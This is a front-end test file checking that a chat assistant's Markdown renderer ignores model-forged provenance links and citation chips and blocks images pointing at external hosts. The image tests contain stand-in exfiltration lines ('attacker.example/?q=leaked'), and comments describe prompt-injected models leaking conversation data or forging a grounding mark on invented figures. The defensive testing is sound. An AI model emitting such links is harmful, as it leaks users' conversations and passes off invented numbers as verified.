/**
 * The provenance overlay's marks may not be mintable by the party they exist to police.
 *
 * The green mark says "this figure matches a value a tool returned this turn", and a citation chip
 * says "this id is a note you can open". Both were decided entirely from the href string, and both
 * schemes were fixed, guessable literals — `#figure/grounded` and `#cite/note/…`. But the text
 * those hrefs are read out of is markdown *written by the model*, so an answer containing
 * `[91.4%](#figure/grounded)` painted an invented number with the mark that means a tool returned
 * it, on a turn where no tool returned anything at all. `remarkGrounding`'s own "nothing returned,
 * so mark nothing" guard never saw the forged link, because the forged link never went through the
 * plugin.
 *
 * A provenance mark the model can mint is worse than no mark: the whole value of the overlay is
 * that it is an independent check, and a chemist trained to read the green underline that way
 * transcribes the invented figure.
 *
 * So the property is not "the href is filtered" — it is that the marks are **not derivable from
 * any string the model can write**. The two positive cases are here as the control: whatever makes
 * a forged link inert must leave the genuine plugin-authored ones working.
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen } from '@testing-library/react';
import { Markdown } from '../src/components/Markdown.tsx';

vi.mock('../src/auth/AuthContext.tsx', () => ({
  useAuth: () => ({ auth: { getAccessToken: async () => null, mode: 'dev' }, ready: true }),
}));

const html = (body: string, figures: number[] = []): string =>
  render(<Markdown figures={figures}>{body}</Markdown>).container.innerHTML;

beforeEach(cleanup);

describe('a mark the model wrote for itself', () => {
  it('does not honour a hand-written grounding link on a turn that returned no numbers', () => {
    // Reachable without an adversary — a model that happens to emit this href gets the credit —
    // and with one: a retrieved ELN record or document can carry the instruction that produces it.
    const out = html('The yield was [91.4%](#figure/grounded).');

    expect(out).not.toContain('matches a value a tool returned');
    // The figure itself still reaches the reader; it is the claim about it that is withdrawn.
    expect(screen.getByText(/91\.4%/)).toBeTruthy();
  });

  it('does not honour a hand-written grounding link on a turn that did return numbers', () => {
    // The guard cannot be "the overlay is off", because the overlay is on for most real answers.
    const out = html('The yield was [91.4%](#figure/grounded).', [1.23]);

    expect(out).not.toContain('matches a value a tool returned');
  });

  it('does not mint a citation chip for a token the citation patterns would never linkify', () => {
    // `remarkCitations` linkifies only the id shapes the backend actually writes, and that list is
    // the whole check — a chip says "this is a note you can open". Written as a link, the model
    // chose the id itself, and it need not be note-shaped at all: in prose `hallucinated-source-1`
    // is correctly left alone, so a chip for it can only have come from the forged href.
    html('The precedent is [well established](#cite/note/hallucinated-source-1).');

    expect(screen.queryByRole('button', { name: 'hallucinated-source-1' })).toBeNull();
    expect(screen.getByText(/well established/)).toBeTruthy();
  });

  it('still marks a figure the turn’s tools really returned', () => {
    const out = html('The pKa is 4.76 and the logD is 2.31.', [4.7601]);

    expect(out).toContain('matches a value a tool returned');
    expect(out).toContain('Not among the values');
  });

  it('still linkifies a citation the answer states as plain prose', () => {
    html('See rxn-suzuki-4821 for the precedent.');

    expect(screen.getByRole('button', { name: 'rxn-suzuki-4821' })).toBeTruthy();
  });
});

describe('a model-emitted image cannot exfiltrate the conversation', () => {
  it('does not emit an <img> for an absolute external URL', () => {
    // The attack: a prompt-injected model writes an image whose src is an attacker host with the
    // secret in the query string; the browser GETs it and the conversation text leaks. The CSP's
    // img-src is the last line, but this component renders no such load at all.
    const out = html('![secret](https://attacker.example/?q=leaked)');

    expect(out).not.toContain('<img');
    expect(out).not.toContain('attacker.example');
    // The omission is visible rather than silent.
    expect(screen.getByText(/image omitted: secret/)).toBeTruthy();
  });

  it('also refuses a protocol-relative host', () => {
    const out = html('![](//attacker.example/pixel.gif)');

    expect(out).not.toContain('<img');
    expect(out).not.toContain('attacker.example');
  });

  it('still renders a same-origin path and an inlined data image', () => {
    const local = html('![diagram](/assets/diagram.png)');
    expect(local).toContain('<img');
    expect(local).toContain('src="/assets/diagram.png"');

    const data = html('![](data:image/png;base64,iVBORw0KGgo=)');
    expect(data).toContain('<img');
    expect(data).toContain('data:image/png;base64');
  });
});
